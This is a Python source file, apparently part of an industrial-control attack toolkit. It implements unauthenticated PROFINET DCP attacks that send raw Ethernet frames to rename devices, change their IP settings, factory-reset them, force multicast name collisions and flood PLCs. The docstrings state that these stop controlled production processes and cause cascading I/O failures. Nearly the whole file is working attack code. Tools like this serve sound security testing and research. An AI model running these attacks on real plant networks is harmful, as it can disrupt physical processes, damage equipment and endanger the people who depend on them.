"""
DCP-based attack modules — all operate on Layer 2, no authentication required.
"""
import struct
import time
import random
from typing import Optional, List, Dict
from dataclasses import dataclass

from ..protocols.profinet_dcp import (
    build_ethernet_frame, build_dcp_frame, build_set_name_request,
    build_set_ip_request, build_factory_reset_request, build_signal_request,
    build_identify_request, DCP_MULTICAST_MAC, PROFINET_ETHER_TYPE,
    DCPFrame, DCPBlock, DCPServiceID, DCPServiceType, DCPOption, DCPSubOption,
)


@dataclass
class AttackResult:
    attack: str
    target: str
    success: bool
    detail: str
    packets_sent: int = 0
    duration: float = 0.0


class DCPAttacks:
    """DCP attack modules targeting PROFINET devices on Layer 2."""

    def __init__(self, interface: str = "eth0", src_mac: bytes = b"\x00\x11\x22\x33\x44\x55"):
        self.interface = interface
        self.src_mac = src_mac
        self._sock = None

    def _get_socket(self):
        if self._sock is None:
            import socket
            import sys
            if sys.platform == "win32":
                raise OSError("Use Scapy mode on Windows")
            self._sock = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.htons(PROFINET_ETHER_TYPE)
            )
            self._sock.bind((self.interface, 0))
        return self._sock

    def _send(self, dst_mac: bytes, payload: bytes):
        frame = build_ethernet_frame(dst_mac, self.src_mac, payload)
        self._get_socket().send(frame)

    def identity_spoof(self, target_mac: str, spoofed_name: str,
                        spoofed_ip: str = "", permanent: bool = False) -> AttackResult:
        """
        DCP Identity Spoofing — change a device's station name without auth.

        Impact: Breaks PROFINET connections (IO-Controllers connect by name).
        A renamed device is orphaned from its controller. Naming it to match
        another device causes address conflicts.
        """
        start = time.time()
        target_bytes = bytes(int(b, 16) for b in target_mac.split(":"))

        payload = build_set_name_request(spoofed_name, xid=random.randint(1, 0xFFFFFFFF),
                                          permanent=permanent)
        self._send(target_bytes, payload)
        packets = 1

        if spoofed_ip:
            ip_payload = build_set_ip_request(
                spoofed_ip, "255.255.255.0", "0.0.0.0",
                xid=random.randint(1, 0xFFFFFFFF), permanent=permanent,
            )
            self._send(target_bytes, ip_payload)
            packets += 1

        return AttackResult(
            attack="DCP Identity Spoof",
            target=target_mac,
            success=True,
            detail=f"Set name='{spoofed_name}'"
                   + (f", ip={spoofed_ip}" if spoofed_ip else "")
                   + (f" [PERMANENT]" if permanent else " [temporary]"),
            packets_sent=packets,
            duration=time.time() - start,
        )

    def ip_manipulation(self, target_mac: str, new_ip: str, new_mask: str = "255.255.255.0",
                         new_gw: str = "0.0.0.0", permanent: bool = False) -> AttackResult:
        """
        DCP IP Manipulation — change device IP without authentication.

        Impact: Redirect traffic, cause network conflicts, isolate devices.
        Setting IP to 0.0.0.0 effectively disables IP communication while
        PROFINET RT (Layer 2) continues working — a stealthy disruption.
        """
        start = time.time()
        target_bytes = bytes(int(b, 16) for b in target_mac.split(":"))
        payload = build_set_ip_request(new_ip, new_mask, new_gw,
                                        xid=random.randint(1, 0xFFFFFFFF),
                                        permanent=permanent)
        self._send(target_bytes, payload)

        return AttackResult(
            attack="DCP IP Manipulation",
            target=target_mac,
            success=True,
            detail=f"Set IP={new_ip}/{new_mask} GW={new_gw}"
                   + (" [PERMANENT]" if permanent else " [temporary]"),
            packets_sent=1,
            duration=time.time() - start,
        )

    def factory_reset(self, target_mac: str) -> AttackResult:
        """
        DCP Factory Reset — reset device to factory defaults.

        Impact: Wipes all configuration including station name, IP, and
        PROFINET project assignment. Device becomes unreachable until
        manually reconfigured. In production, this stops the controlled process.
        """
        start = time.time()
        target_bytes = bytes(int(b, 16) for b in target_mac.split(":"))
        payload = build_factory_reset_request(xid=random.randint(1, 0xFFFFFFFF))
        self._send(target_bytes, payload)

        return AttackResult(
            attack="DCP Factory Reset",
            target=target_mac,
            success=True,
            detail="Factory reset command sent — device will lose all configuration",
            packets_sent=1,
            duration=time.time() - start,
        )

    def name_collision(self, name: str, count: int = 10) -> AttackResult:
        """
        DCP Name Collision — set multiple devices to the same name.

        Impact: PROFINET spec requires unique names. When two devices share a name,
        the IO-Controller cannot establish connections to either, causing a cascading
        failure of all IO associated with that controller.
        """
        start = time.time()
        for i in range(count):
            payload = build_set_name_request(
                name, xid=random.randint(1, 0xFFFFFFFF), permanent=True
            )
            self._send(DCP_MULTICAST_MAC, payload)
            time.sleep(0.01)

        return AttackResult(
            attack="DCP Name Collision",
            target="broadcast",
            success=True,
            detail=f"Sent {count} Set-Name requests for '{name}' to multicast",
            packets_sent=count,
            duration=time.time() - start,
        )

    def dcp_flood(self, target_mac: str, count: int = 1000,
                   delay: float = 0.001) -> AttackResult:
        """
        DCP Flood — overwhelm device with DCP requests.

        Impact: PROFINET devices have limited DCP processing capacity.
        Flooding can cause missed RT cycles, watchdog timeouts, or
        device resets on resource-constrained PLCs.
        """
        start = time.time()
        target_bytes = bytes(int(b, 16) for b in target_mac.split(":"))

        for i in range(count):
            # Alternate between different DCP operations
            ops = [
                build_identify_request(xid=i),
                build_set_name_request(f"flood-{i}", xid=i),
                build_signal_request(xid=i),
            ]
            payload = random.choice(ops)
            self._send(target_bytes, payload)
            if delay > 0:
                time.sleep(delay)

        return AttackResult(
            attack="DCP Flood",
            target=target_mac,
            success=True,
            detail=f"Sent {count} DCP requests in {time.time()-start:.2f}s",
            packets_sent=count,
            duration=time.time() - start,
        )



def print_attack_results(results: List[AttackResult]):
    print(f"\n  {'='*70}")
    print(f"  ATTACK RESULTS — {len(results)} attacks executed")
    print(f"  {'='*70}")

    for r in results:
        status = "SUCCESS" if r.success else "FAILED"
        print(f"\n  [{status}] {r.attack}")
        print(f"    Target:  {r.target}")
        print(f"    Detail:  {r.detail}")
        print(f"    Packets: {r.packets_sent} | Time: {r.duration:.3f}s")
